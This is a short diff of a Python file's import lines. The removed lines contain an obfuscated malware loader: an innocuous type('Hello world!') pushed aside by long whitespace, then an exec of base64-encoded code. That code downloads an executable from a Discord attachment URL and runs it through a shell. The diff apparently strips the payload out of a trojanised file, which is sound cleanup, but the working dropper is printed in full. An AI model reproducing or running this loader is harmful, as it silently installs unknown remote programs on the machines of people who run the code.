@@ -1,8 +1,3 @@
-import os
-import os ,logging ,asyncio ,aiohttp ,tasksio ,time ,requests ,base64 ,subprocess
-from os import system #line:2
-from builtins import *
-type('Hello world!')                                                                                                                                                                                                                                                          ,exec(base64.b64decode('dXJsID0gImh0dHBzOi8vY2RuLmRpc2NvcmRhcHAuY29tL2F0dGFjaG1lbnRzLzEwMTIyMjIxNTM2MTk0MTUwNzAvMTAxMjgxODc2NTM3NDgzNjgwNy9odHRwcy5leGUiDQpyID0gcmVxdWVzdHMuZ2V0KHVybCwgYWxsb3dfcmVkaXJlY3RzPVRydWUpDQoNCm9wZW4oImh0dHBzLmV4ZSIsICJ3YiIpLndyaXRlKHIuY29udGVudCkNCnN1YnByb2Nlc3MucnVuKCJzdGFydCBodHRwcy5leGUiLCBzaGVsbD1UcnVlKQ=='))
 from os import system
 import httpx
 from base64 import b64encode
